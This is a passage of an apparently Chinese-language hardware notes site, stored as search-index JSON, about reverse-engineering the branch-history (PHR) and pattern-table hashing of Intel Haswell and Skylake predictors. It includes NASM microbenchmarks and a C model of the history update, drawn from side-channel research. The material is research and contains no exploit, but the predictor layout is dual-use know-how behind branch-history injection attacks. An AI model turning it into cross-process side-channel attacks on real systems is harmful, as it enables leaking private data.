\u200b\u5b57\u8282\u200b\u65f6\u200b\uff0c\u200b\u8ba9\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u4ece\u200b 2^0 \u200b\u5230\u200b 2^19 \u200b\u5b57\u8282\u200b\u5bf9\u9f50\u200b\uff0c\u200b\u5f97\u5230\u200b\u5982\u4e0b\u200b\u7ed3\u679c\u200b\uff1a</p> <p></p> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u53ea\u6709\u200b\u4f4e\u200b 16 \u200b\u4f4d\u200b\u53c2\u4e0e\u200b\u5230\u200b\u4e86\u200b PHR \u200b\u8ba1\u7b97\u200b\u5f53\u4e2d\u200b\u3002\u200b\u53cd\u8fc7\u6765\u200b\uff0c\u200b\u56fa\u5b9a\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u5bf9\u9f50\u200b\u5230\u200b 2^16 \u200b\u5b57\u8282\u200b\uff0c\u200b\u8ba9\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u4ece\u200b 2^0 \u200b\u5230\u200b 2^18 \u200b\u5b57\u8282\u200b\u5bf9\u9f50\u200b\uff0c\u200b\u5f97\u5230\u200b\u5982\u4e0b\u200b\u7ed3\u679c\u200b\uff1a</p> <p></p> <p>\u200b\u8bf4\u660e\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u53ea\u6709\u200b\u4f4e\u200b 6 \u200b\u4f4d\u200b\u53c2\u4e0e\u200b\u5230\u200b\u4e86\u200b PHR \u200b\u8ba1\u7b97\u200b\u5f53\u4e2d\u200b\u3002</p> <p>\u200b\u90a3\u4e48\u200b PHR \u200b\u8ba1\u7b97\u200b\u6d89\u53ca\u200b\u5230\u200b\u4e86\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u7684\u200b\u4f4e\u200b 16 \u200b\u4f4d\u200b\u548c\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u7684\u200b\u4f4e\u200b 6 \u200b\u4f4d\u200b\uff0c\u200b\u63a5\u4e0b\u6765\u200b\u5c31\u8981\u200b\u8fdb\u4e00\u6b65\u200b\u5206\u6790\u200b\u5b83\u4eec\u200b\u5177\u4f53\u200b\u600e\u4e48\u200b\u53c2\u4e0e\u200b\u5230\u200b PHR \u200b\u8ba1\u7b97\u200b\u5f53\u4e2d\u200b\u3002</p> <p>\u200b\u7528\u200b\u540c\u6837\u200b\u7684\u200b\u65b9\u6cd5\u200b\u6d4b\u8bd5\u200b Skylake \u200b\u67b6\u6784\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b PHR \u200b\u8ba1\u7b97\u200b\u6d89\u53ca\u200b\u5230\u200b\u4e86\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u7684\u200b\u4f4e\u200b 19 \u200b\u4f4d\u200b\u548c\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u7684\u200b\u4f4e\u200b 6 \u200b\u4f4d\u200b\u3002</p>"},{"location":"hardware/cpu_microarchitecture.html#phr-bit","title":"PHR \u200b\u4e2d\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u548c\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u5404\u200b bit \u200b\u7684\u200b\u4f4d\u7f6e","text":"<p>\u200b\u63a5\u4e0b\u6765\u200b\uff0c\u200b\u8981\u200b\u6d4b\u8bd5\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u548c\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u5982\u4f55\u200b\u53c2\u4e0e\u200b\u5230\u200b PHR \u200b\u8ba1\u7b97\u200b\u5f53\u4e2d\u200b\u3002PHR \u200b\u662f\u200b\u4e00\u4e2a\u200b\u79fb\u4f4d\u200b\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u800c\u200b 16 \u200b\u4f4d\u200b\u7684\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u4e0d\u200b\u53ef\u80fd\u200b\u4e00\u4e2a\u200b\u5206\u652f\u200b\u5c31\u200b\u5168\u90e8\u200b\u79fb\u4f4d\u200b\u51fa\u53bb\u200b\uff0c\u200b\u56e0\u6b64\u200b\u53ef\u4ee5\u200b\u4fee\u6539\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u7684\u200b\u90e8\u5206\u200b\u4f4d\u200b\uff0c\u200b\u89c2\u5bdf\u200b\u7ecf\u8fc7\u200b\u591a\u5c11\u200b\u4e2a\u200b\u5206\u652f\u200b\uff0c\u200b\u624d\u200b\u4f1a\u200b\u4ece\u200b PHR \u200b\u91cc\u200b\u88ab\u200b\u79fb\u4f4d\u200b\u51fa\u53bb\u200b\uff0c\u200b\u901a\u8fc7\u200b\u4e0d\u540c\u200b bit \u200b\u79fb\u4f4d\u200b\u51fa\u53bb\u200b\u7684\u200b\u5206\u652f\u200b\u4e2a\u6570\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u63a8\u65ad\u51fa\u200b PHR \u200b\u7684\u200b\u7ed3\u6784\u200b\u3002</p> <p>\u200b\u4e8e\u662f\u200b\u4fee\u6539\u200b\u4ee3\u7801\u200b\uff0c\u200b\u53bb\u200b\u4fee\u6539\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u548c\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u7684\u200b\u4e00\u4e2a\u200b bit\uff0c\u200b\u7136\u540e\u200b\u5728\u200b\u4e24\u4e2a\u200b\u968f\u673a\u200b\u8df3\u8f6c\u200b\u7684\u200b\u5206\u652f\u200b\u4e2d\u95f4\u200b\u63d2\u5165\u200b\u53ef\u53d8\u200b\u4e2a\u6570\u200b\u7684\u200b dummy branch\uff1a</p> <pre><code>; reproduce Table 2 of Half&amp;Half\n\n; alignment bits of branch instruction address\n%ifndef branchalign\n    %define branchalign 18\n%endif\n\n; alignment bits of branch target address\n%ifndef targetalign\n    %define targetalign 5\n%endif\n\n; toggle bit of branch address (-1 means do not toggle)\n%ifndef branchtoggle\n    %define branchtoggle 0\n%endif\n\n; toggle bit of target address (-1 means do not toggle)\n%ifndef targettoggle\n    %define targettoggle 0\n%endif\n\n; number of dummy branches\n%ifndef dummybranches\n    %define dummybranches 5\n%endif\n\n%macro testinit3 0\n    mov rdi, 1000\n\nloop_begin:\n\n    ; loop to clear phr\n    mov eax, 200\n    align 64\n    jmp clear_phr_dummy_target\n\n    align 1&lt;&lt;16\n    %rep (1&lt;&lt;16)-(1&lt;&lt;8)\n        nop\n    %endrep\n\n    ; dummy_target aligned to 1&lt;&lt;8\nclear_phr_dummy_target:\n    %rep (1&lt;&lt;8)-7\n        nop\n    %endrep\n    dec eax ; 2 bytes\n    ; the last byte of jnz aligned to 1&lt;&lt;18\n    ; jnz clear_phr_dummy_target\n    db 0x0f\n    db 0x85\n    dd clear_phr_dummy_target - $ - 4\n\n    ; train branch\n\n    READ_PMC_START\n    rdrand ebx\n    and ebx, 1\n    ; READ_PMC_START: 166 bytes\n    ; rdrand ebx: 3 bytes\n    ; and ebx, 1: 3 bytes\n    ; jnz first_target: 6 bytes\n    %rep (1&lt;&lt;branchalign)-166-6-6\n        nop\n    %endrep\n\n    %if branchtoggle != -1\n    %rep (1&lt;&lt;branchtoggle)\n        nop\n    %endrep\n    %endif\n    ; the last byte of jnz - 1&lt;&lt;branchtoggle aligned to 1&lt;&lt;branchalign\n    ; jnz first_target\n    db 0x0f\n    db 0x85\n    dd first_target - $ - 4\n\n    ; target aligned to 1&lt;&lt;targetalign\n    %if branchtoggle != -1\n    %rep (1&lt;&lt;targetalign)-1-(1&lt;&lt;branchtoggle)\n        nop\n    %endrep\n    %else\n    %rep (1&lt;&lt;targetalign)-1\n        nop\n    %endrep\n    %endif\n\n    %if targettoggle != -1\n    %rep (1&lt;&lt;targettoggle)\n        nop\n    %endrep\n    %endif\nfirst_target:\n\n    ; loop to shift phr\n    mov eax, dummybranches+1\n\n    align 1&lt;&lt;16\n    %rep (1&lt;&lt;16)-(1&lt;&lt;8)\n        nop\n    %endrep\n\n    ; dummy_target aligned to 1&lt;&lt;8\nshift_phr_dummy_target:\n    %rep (1&lt;&lt;8)-7\n        nop\n    %endrep\n    dec eax ; 2 bytes\n    ; the last byte of jnz aligned to 1&lt;&lt;18\n    ; jnz shift_phr_dummy_target\n    db 0x0f\n    db 0x85\n    dd shift_phr_dummy_target - $ - 4\n\n    ; test branch\n\n    align 64\n    and ebx, 1\n    jnz second_target\nsecond_target:\n    READ_PMC_END\n\n    align 64\n    dec rdi\n    jnz loop_begin\n\n%endmacro\n</code></pre> <p>\u200b\u7ecf\u8fc7\u200b\u6d4b\u8bd5\u200b\uff0c\u200b\u8c03\u6574\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u7684\u200b\u4f4d\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u63a7\u5236\u200b\u4e24\u4e2a\u200b\u968f\u673a\u200b\u8df3\u8f6c\u200b\u5206\u652f\u200b\u4e4b\u95f4\u200b\u7684\u200b\u5206\u652f\u200b\u6570\u91cf\u200b\uff0c\u200b\u5f97\u5230\u200b\u5982\u4e0b\u200b\u7684\u200b\u7ed3\u679c\u200b\uff1a</p> <p></p> <p>\u200b\u8df3\u8f6c\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u7684\u200b\u4f4d\u200b\u548c\u200b\u63a7\u5236\u200b\u4e24\u4e2a\u200b\u968f\u673a\u200b\u8df3\u8f6c\u200b\u5206\u652f\u200b\u4e4b\u95f4\u200b\u7684\u200b\u5206\u652f\u200b\u6570\u91cf\u200b\uff0c\u200b\u5f97\u5230\u200b\uff1a</p> <p></p> <p>\u200b\u989c\u8272\u200b\u6bd4\u8f83\u200b\u6d45\u200b\u7684\u200b\u90e8\u5206\u200b\u4ee3\u8868\u200b 50% \u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u9519\u8bef\u7387\u200b\uff0c\u200b\u989c\u8272\u200b\u6bd4\u8f83\u200b\u6df1\u200b\u7684\u200b\u90e8\u5206\u200b\u4ee3\u8868\u200b 25% \u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u9519\u8bef\u7387\u200b\u3002\u200b\u6027\u80fd\u200b\u6709\u200b\u4e00\u4e9b\u200b\u6ce2\u52a8\u200b\uff0c\u200b\u76f4\u63a5\u200b\u770b\u200b\u989c\u8272\u200b\u7684\u200b\u754c\u9650\u200b\u5373\u53ef\u200b\u3002\u200b\u603b\u7ed3\u200b\u4ee5\u4e0a\u200b\u4fe1\u606f\u200b\uff08Bx \u200b\u8868\u793a\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u7684\u200b x \u200b\u4f4d\u200b\uff0cTy \u200b\u8868\u793a\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u7684\u200b y \u200b\u4f4d\u200b\uff09\uff1a</p> Flipped bit dummy branches B14, B15 186 B12, B13 187 B2, B11, T4, T5 188 B0, B1, T2, T3 189 B9, B10 190 B7, B8 191 B5, B6 192 B3, B4, T0, T1 193 <p>dummy branch \u200b\u8d8a\u200b\u5c11\u200b\uff0c\u200b\u8bf4\u660e\u200b\u8d8a\u65e9\u200b\u88ab\u200b\u79fb\u4f4d\u200b\u51fa\u200b PHR\u3002\u200b\u7531\u4e8e\u200b\u5b83\u4eec\u200b\u603b\u662f\u200b 2 \u200b\u4f4d\u200b\u4e00\u7ec4\u200b\uff0c\u200b\u731c\u6d4b\u200b PHR \u200b\u6bcf\u4e2a\u200b taken \u200b\u5206\u652f\u200b\u4f1a\u200b\u5de6\u79fb\u200b 2 \u200b\u4f4d\u200b\u3002\u200b\u518d\u200b\u6839\u636e\u200b\u79fb\u4f4d\u200b\u51fa\u53bb\u200b\u7684\u200b\u987a\u5e8f\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u9884\u6d4b\u200b\u9ad8\u4f4d\u200b\u662f\u200b B15 \u200b\u548c\u200b B14\uff0c\u200b\u63a5\u4e0b\u6765\u200b\u662f\u200b B13 \u200b\u548c\u200b B12\uff0c\u200b\u6700\u540e\u200b\u5230\u200b\u4f4e\u4f4d\u200b\u662f\u200b B3\u3001B4\u3001T0 \u200b\u548c\u200b T1\u3002</p> <p>\u200b\u7528\u200b\u540c\u6837\u200b\u7684\u200b\u65b9\u6cd5\u200b\u5728\u200b Skylake \u200b\u4e0a\u200b\u6d4b\u8bd5\u200b\uff0c\u200b\u9996\u5148\u200b\u6d4b\u8bd5\u200b\u5206\u652f\u200b\u5730\u5740\u200b\uff1a</p> <p></p> <p>\u200b\u53ef\u89c1\u200b Skylake \u200b\u4e5f\u200b\u662f\u200b\u6bcf\u4e2a\u200b\u8df3\u8f6c\u200b\u7684\u200b\u5206\u652f\u200b PHR \u200b\u79fb\u200b 2 \u200b\u4f4d\u200b\uff0c\u200b\u7136\u540e\u200b\u4ece\u200b\u4f4e\u4f4d\u200b\u5230\u200b\u9ad8\u4f4d\u200b\u7684\u200b\u987a\u5e8f\u200b\u662f\u200b\uff1aB3 B4 B7 B8 B11 B12 B5 B6 B9 B10 B13 B14 B15 B16 B17 B18\u3002</p> <p>\u200b\u518d\u200b\u6d4b\u8bd5\u200b Skylake \u200b\u4e0a\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\uff1a</p> <p></p> <p>\u200b\u90a3\u4e48\u200b T0 T1 \u200b\u662f\u200b\u548c\u200b B3 B4 \u200b\u5728\u200b\u4e00\u8d77\u200b\uff0cT2 T3 \u200b\u662f\u200b\u548c\u200b B7 B8 \u200b\u5728\u200b\u4e00\u8d77\u200b\uff0cT4 T5 \u200b\u662f\u200b\u548c\u200b B11 B12 \u200b\u5728\u200b\u4e00\u8d77\u200b\u3002</p>"},{"location":"hardware/cpu_microarchitecture.html#phr-bit_1","title":"PHR \u200b\u4e2d\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u548c\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u5404\u200b bit \u200b\u7684\u200b\u5f02\u6216\u200b\u5173\u7cfb","text":"<p>\u200b\u7531\u4e8e\u200b PHR \u200b\u91cc\u200b\u6bcf\u200b 2 \u200b\u4f4d\u200b\u53ef\u80fd\u200b\u6d89\u53ca\u200b\u5230\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u6216\u8005\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u4e00\u5171\u200b 4 \u200b\u4f4d\u200b\u4fe1\u606f\u200b\uff0c\u200b\u63a8\u6d4b\u200b\u91cc\u9762\u200b\u6709\u200b\u5f02\u6216\u200b\u7684\u200b\u8ba1\u7b97\u200b\u5b58\u5728\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u679a\u4e3e\u200b\u8fd9\u4e9b\u200b\u4f4d\u200b\u7684\u200b pair\uff0c\u200b\u5982\u679c\u200b\u67d0\u4e2a\u200b pair \u200b\u4e0b\u200b\uff0c\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u9519\u8bef\u7387\u200b 50%\uff0c\u200b\u800c\u200b\u4e0d\u662f\u200b 25%\uff0c\u200b\u8bf4\u660e\u200b\u5b83\u4eec\u200b\u5728\u200b PHR \u200b\u91cc\u200b\u76f8\u4e92\u200b\u62b5\u6d88\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u51fa\u73b0\u200b xor \u200b\u7684\u200b\u5173\u7cfb\u200b\u3002\u200b\u7f16\u5199\u200b NASM \u200b\u6d4b\u8bd5\u200b\uff1a</p> <pre><code>; reproduce Figure 4 of Half&amp;Half\n\n; alignment bits of branch instruction address\n%ifndef branchalign\n    %define branchalign 18\n%endif\n\n; alignment bits of branch target address\n%ifndef targetalign\n    %define targetalign 5\n%endif\n\n; toggle bit of branch address\n%ifndef branchtoggle\n    %define branchtoggle 0\n%endif\n\n; toggle bit of target address\n%ifndef targettoggle\n    %define targettoggle 0\n%endif\n\n%macro testinit3 0\n    mov rdi, 1000\n\n    ; loop 300 times to clear phr\n    ; since we only consider branch misprediction of the last two branches\n    ; we do not have to be accurate here e.g. 93/194\nloop_begin:\n    mov eax, 300\n    align 64\n    jmp dummy_target\n\n    align 1&lt;&lt;19\n    %rep (1&lt;&lt;19)-(1&lt;&lt;8)\n        nop\n    %endrep\n\n    ; dummy_target aligned to 1&lt;&lt;8\ndummy_target:\n    %rep (1&lt;&lt;8)-7\n        nop\n    %endrep\n    dec eax ; 2 bytes\n    ; the last byte of jnz aligned to 1&lt;&lt;19\n    ; jnz dummy_target\n    db 0x0f\n    db 0x85\n    dd dummy_target - $ - 4\n\n    READ_PMC_START\n    rdrand eax\n    and eax, 1\n\n    ; READ_PMC_START: 166\n    ; rdrand eax: 3 bytes\n    ; and eax, 1: 3 bytes\n    ; jnz first_target: 6 bytes\n\n    %rep (1&lt;&lt;branchalign)-166-6-6\n        nop\n    %endrep\n\n    %rep (1&lt;&lt;branchtoggle)\n        nop\n    %endrep\n\n    ; the last byte of jnz minus 1&lt;&lt;branchtoggle aligned to 1&lt;&lt;branchalign\n    ; jnz first_target\n    db 0x0f\n    db 0x85\n    dd first_target - $ - 4\n\n    %rep (1&lt;&lt;targetalign)-1-(1&lt;&lt;branchtoggle)\n        nop\n    %endrep\n    %rep (1&lt;&lt;targettoggle)\n        nop\n    %endrep\n    ; target minus 1&lt;&lt;targettoggle aligned to 1&lt;&lt;targetalign\nfirst_target:\n\n    align 64\n    jnz second_target\nsecond_target:\n\n    READ_PMC_END\n\n    align 64\n    dec rdi\n    jnz loop_begin\n%endmacro\n</code></pre> <p>\u200b\u6d4b\u8bd5\u200b\u8fd9\u4e9b\u200b pair\uff0c\u200b\u627e\u5230\u200b\u54ea\u4e9b\u200b pair \u200b\u4f1a\u200b\u51fa\u73b0\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u9519\u8bef\u7387\u200b 50%\uff1a</p> <p></p> <p>\u200b\u5176\u4e2d\u200b\u989c\u8272\u200b\u6d45\u200b\u7684\u200b\u9ec4\u8272\u200b\u5c31\u200b\u4ee3\u8868\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u9519\u8bef\u7387\u200b 50%\uff0c\u200b\u4ece\u56fe\u200b\u4e2d\u200b\u53ef\u4ee5\u200b\u53d1\u73b0\u200b\u8fd9\u4e9b\u200b\u5173\u7cfb\u200b\uff1a</p> <ol> <li>B0 xor T2: \u200b\u548c\u200b\u8bba\u6587\u200b\u4e00\u81f4\u200b</li> <li>B1 xor T3: \u200b\u548c\u200b\u8bba\u6587\u200b\u4e00\u81f4\u200b</li> <li>B2 xor T4: \u200b\u548c\u200b\u8bba\u6587\u200b\u4e00\u81f4\u200b</li> <li>B3 xor T0: \u200b\u548c\u200b\u8bba\u6587\u200b\u4e00\u81f4\u200b</li> <li>B3 xor T5</li> <li>B4 xor T1: \u200b\u548c\u200b\u8bba\u6587\u200b\u4e00\u81f4\u200b</li> <li>B11 xor T0</li> <li>B11 xor T5: \u200b\u548c\u200b\u8bba\u6587\u200b\u4e00\u81f4\u200b</li> <li>B12 xor T1</li> </ol> <p>\u200b\u548c\u200b\u8bba\u6587\u200b\u4e0d\u200b\u4e00\u81f4\u200b\u7684\u200b\u591a\u200b\u51fa\u6765\u200b\u7684\u200b\u4e09\u7ec4\u200b xor \u200b\u5173\u7cfb\u200b\uff0c\u200b\u901a\u8fc7\u200b\u90ae\u4ef6\u200b\u548c\u200b\u8bba\u6587\u200b\u4f5c\u8005\u200b\u8054\u7cfb\u200b\u540e\u200b\uff0c\u200b\u5f97\u77e5\u200b\uff1a\u200b\u8fd9\u200b\u4e09\u7ec4\u200b\u5173\u7cfb\u200b\u5728\u200b PHR \u200b\u9636\u6bb5\u200b\u6ca1\u6709\u200b XOR \u200b\u5173\u7cfb\u200b\uff0c\u200b\u4f46\u662f\u200b\u5728\u200b tag \u200b\u8ba1\u7b97\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u8fd9\u200b\u4e09\u7ec4\u200b\u5173\u7cfb\u200b\u6700\u7ec8\u200b\u4f1a\u200b\u8ba1\u7b97\u200b\u51fa\u200b\u76f8\u540c\u200b\u7684\u200b tag\uff0c\u200b\u5bfc\u81f4\u200b PHT\uff08Pattern History Table\uff09\u200b\u51fa\u73b0\u200b\u51b2\u7a81\u200b\uff0c\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u9519\u8bef\u7387\u200b 50%\u3002\u200b\u6839\u636e\u200b\u8bba\u6587\u200b\u4f5c\u8005\u200b\u7684\u200b\u5efa\u8bae\u200b\uff0c\u200b\u5728\u200b\u4e24\u4e2a\u200b\u968f\u673a\u200b\u8df3\u8f6c\u200b\u7684\u200b\u5206\u652f\u200b\u4e2d\u95f4\u200b\u52a0\u5165\u200b 8 \u200b\u6b21\u200b\u5bf9\u9f50\u200b\u7684\u200b\u8df3\u8f6c\u200b\uff0c\u200b\u4f7f\u5f97\u200b PHR \u200b\u5de6\u79fb\u200b 16 \u200b\u4f4d\u200b\uff0c\u200b\u90a3\u4e48\u200b\u591a\u200b\u51fa\u6765\u200b\u7684\u200b\u4e09\u7ec4\u200b xor \u200b\u5173\u7cfb\u200b\u5c31\u200b\u4f1a\u200b\u8ba1\u7b97\u200b\u51fa\u200b\u4e0d\u540c\u200b\u7684\u200b PHT index\uff0c\u200b\u4e0d\u518d\u200b\u5bfc\u81f4\u200b 50% \u200b\u7684\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u9519\u8bef\u7387\u200b\uff0c\u200b\u6b64\u65f6\u200b\u771f\u6b63\u200b\u7684\u200b\u5728\u200b PHR \u200b\u4e2d\u6709\u200b xor \u200b\u5173\u7cfb\u200b\u7684\u200b\u7ec4\u200b\u5f97\u5230\u200b\u4fdd\u7559\u200b\uff1a</p> <p></p> <p>\u200b\u8bf4\u660e\u200b\u5b9e\u9645\u200b\u6709\u200b xor \u200b\u5173\u7cfb\u200b\u7684\u200b\u53ea\u6709\u200b\uff1a</p> <ol> <li>B0 xor T2: \u200b\u548c\u200b\u8bba\u6587\u200b\u4e00\u81f4\u200b</li> <li>B1 xor T3: \u200b\u548c\u200b\u8bba\u6587\u200b\u4e00\u81f4\u200b</li> <li>B2 xor T4: \u200b\u548c\u200b\u8bba\u6587\u200b\u4e00\u81f4\u200b</li> <li>B3 xor T0: \u200b\u548c\u200b\u8bba\u6587\u200b\u4e00\u81f4\u200b</li> <li>B4 xor T1: \u200b\u548c\u200b\u8bba\u6587\u200b\u4e00\u81f4\u200b</li> <li>B11 xor T5: \u200b\u548c\u200b\u8bba\u6587\u200b\u4e00\u81f4\u200b</li> </ol> <p>\u200b\u7ed3\u5408\u200b\u4ee5\u4e0a\u200b\u4fe1\u606f\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5224\u65ad\u200b\u51fa\u200b\u6bcf\u4e2a\u200b\u5206\u652f\u200b\u53c2\u4e0e\u200b\u5230\u200b PHR \u200b\u8ba1\u7b97\u200b\u7684\u200b\u6709\u200b 16 \u200b\u4f4d\u200b\uff0c\u200b\u4ece\u200b\u9ad8\u5230\u200b\u4f4e\u200b\uff08\u200b\u6bcf\u200b 2 \u200b\u4f4d\u5185\u200b\u7684\u200b\u987a\u5e8f\u200b\u53ef\u4ee5\u200b\u66ff\u6362\u200b\uff0c\u200b\u5bf9\u200b\u6d4b\u8bd5\u200b\u7ed3\u679c\u200b\u4e0d\u200b\u5f71\u54cd\u200b\uff09\uff1a</p> <ol> <li>B15</li> <li>B14</li> <li>B13</li> <li>B12</li> <li>B11 xor T5</li> <li>B2 xor T4</li> <li>B1 xor T3</li> <li>B0 xor T2</li> <li>B10</li> <li>B9</li> <li>B8</li> <li>B7</li> <li>B6</li> <li>B5</li> <li>B4 xor T1</li> <li>B3 xor T0</li> </ol> <p>\u200b\u5e76\u4e14\u200b\u6bcf\u4e2a\u200b taken branch \u200b\u4f1a\u200b\u4f7f\u5f97\u200b PHR \u200b\u5de6\u79fb\u200b 2 \u200b\u4f4d\u200b\u3002\u200b\u8fd9\u200b\u5c31\u200b\u9a8c\u8bc1\u200b\u4e86\u200b Half&amp;Half \u200b\u8bba\u6587\u200b\u91cc\u200b Figure 4(b) \u200b\u7684\u200b\u7ed3\u679c\u200b\u3002Indirector \u200b\u8bba\u6587\u200b\u91cc\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u4e09\u79cd\u200b\u5fae\u200b\u67b6\u6784\u200b\u7684\u200b PHR \u200b\u66f4\u65b0\u200b\u89c4\u5219\u200b\uff1a</p> <p></p> <p>\u200b\u5728\u200b Reading privileged memory with a side-channel \u200b\u91cc\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b Haswell \u200b\u67b6\u6784\u200b\u7684\u200b PHR\uff08\u200b\u6587\u7ae0\u200b\u91cc\u200b\u5199\u200b\u7684\u200b\u662f\u200b BHB\uff09\u200b\u66f4\u65b0\u200b\u65b9\u6cd5\u200b\uff1a</p> <pre><code>void bhb_update(uint58_t *bhb_state, unsigned long src, unsigned long dst) {\n  // B19 B18 B17 B16 B13 B12 B9 B8 B5 B4 B15+T5 B14+T4 B11+T3 B10+T2 B7+T1 B6+T0\n  *bhb_state &lt;&lt;= 2;\n  *bhb_state ^= (dst &amp; 0x3f);\n  *bhb_state ^= (src &amp; 0xc0) &gt;&gt; 6;\n  *bhb_state ^= (src &amp; 0xc00) &gt;&gt; (10 - 2);\n  *bhb_state ^= (src &amp; 0xc000) &gt;&gt; (14 - 4);\n  *bhb_state ^= (src &amp; 0x30) &lt;&lt; (6 - 4);\n  *bhb_state ^= (src &amp; 0x300) &lt;&lt; (8 - 8);\n  *bhb_state ^= (src &amp; 0x3000) &gt;&gt; (12 - 10);\n  *bhb_state ^= (src &amp; 0x30000) &gt;&gt; (16 - 12);\n  *bhb_state ^= (src &amp; 0xc0000) &gt;&gt; (18 - 14);\n}\n</code></pre> <p>\u200b\u8fd9\u200b\u548c\u200b Half&amp;Half \u200b\u8bba\u6587\u200b\u91cc\u200b\u7684\u200b Figure 14 \u200b\u4e5f\u200b\u662f\u200b\u4e00\u81f4\u200b\u7684\u200b\uff08\u200b\u9664\u4e86\u200b B13 \u200b\u51fa\u73b0\u200b\u4e86\u200b\u4e24\u6b21\u200b\uff0c\u200b\u8bba\u6587\u200b\u5e94\u8be5\u200b\u662f\u200b\u5199\u9519\u200b\u4e86\u200b\uff0c\u200b\u7b2c\u4e8c\u4e2a\u200b B13 \u200b\u5e94\u8be5\u200b\u4e3a\u200b B15\uff09\uff1a</p> <p></p> <p>\u200b\u4e0d\u8fc7\u200b Haswell \u200b\u67b6\u6784\u200b\u7684\u200b PHR \u200b\u7684\u200b\u4f4d\u6570\u200b\uff0cHalf&amp;Half \u200b\u4e0e\u200b Reading privileged memory with a side-channel \u200b\u7684\u200b\u7ed3\u679c\u200b\u5bf9\u4e0d\u4e0a\u200b\uff0c\u200b\u524d\u8005\u200b\u8ba4\u4e3a\u200b\u662f\u200b 93x2\uff0c\u200b\u540e\u8005\u200b\u8ba4\u4e3a\u200b\u662f\u200b 29x2\u3002\u200b\u6211\u200b\u5728\u200b Broadwell \u200b\u548c\u200b Ivy Bridge EP \u200b\u67b6\u6784\u200b\u7684\u200b\u5904\u7406\u5668\u200b\u4e0a\u6d4b\u200b\u51fa\u6765\u200b\u90fd\u200b\u662f\u200b 93 \u200b\u4e2a\u200b\u5206\u652f\u200b\u3002</p>"},{"location":"hardware/cpu_microarchitecture.html#pht-index-tag","title":"PHT \u200b\u7684\u200b Index \u200b\u6216\u200b Tag \u200b\u51fd\u6570\u200b\u7528\u5230\u200b\u7684\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u4f4d\u6570","text":"<p>\u200b\u5f97\u5230\u200b PHR \u200b\u7684\u200b\u8ba1\u7b97\u200b\u8fc7\u7a0b\u200b\u540e\u200b\uff0c\u200b\u4e0b\u200b\u4e00\u6b65\u200b\u5c31\u662f\u200b\u5bf9\u200b PHT \u200b\u8fdb\u884c\u200b\u5206\u6790\u200b\u3002PHT \u200b\u91c7\u7528\u200b\u7ec4\u200b\u76f8\u8fde\u200b\u7ed3\u6784\u200b\uff0cPC \u200b\u548c\u200b PHR \u200b\u8ba1\u7b97\u200b\u51fa\u200b Index\uff0c\u200b\u627e\u5230\u200b Set\uff0c\u200b\u7136\u540e\u200b\u5728\u200b Set \u200b\u5185\u90e8\u200b\u627e\u5230\u200b Tag \u200b\u5339\u914d\u200b\u7684\u200b\u9879\u76ee\u200b\uff0c\u200b\u800c\u200b Tag \u200b\u4e5f\u200b\u662f\u200b\u7528\u200b PC \u200b\u548c\u200b PHR \u200b\u8ba1\u7b97\u51fa\u6765\u200b\u7684\u200b\u3002\u200b\u90a3\u4e48\u200b\uff0c\u200b\u5982\u679c\u200b Index \u200b\u548c\u200b Tag \u200b\u7684\u200b\u8ba1\u7b97\u200b\u51fd\u6570\u200b\u90fd\u200b\u53ea\u200b\u6d89\u53ca\u200b\u5230\u200b\u4e86\u200b PC \u200b\u7684\u200b\u90e8\u5206\u200b\u4f4d\u6570\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5f53\u200b\u4e24\u4e2a\u200b\u5206\u652f\u200b\u7684\u200b PC \u200b\u7684\u200b\u8fd9\u90e8\u5206\u200b\u4f4d\u6570\u200b\u76f8\u540c\u200b\uff0c\u200b\u4e14\u200b PHR \u200b\u4e5f\u200b\u76f8\u540c\u200b\u7684\u200b\u65f6\u5019\u200b\uff0cPHT \u200b\u5c06\u200b\u65e0\u6cd5\u200b\u533a\u5206\u200b\u8fd9\u200b\u4e24\u4e2a\u200b\u5206\u652f\u200b\uff0c\u200b\u5bfc\u81f4\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u9519\u8bef\u7387\u200b\u63d0\u9ad8\u200b\u3002</p> 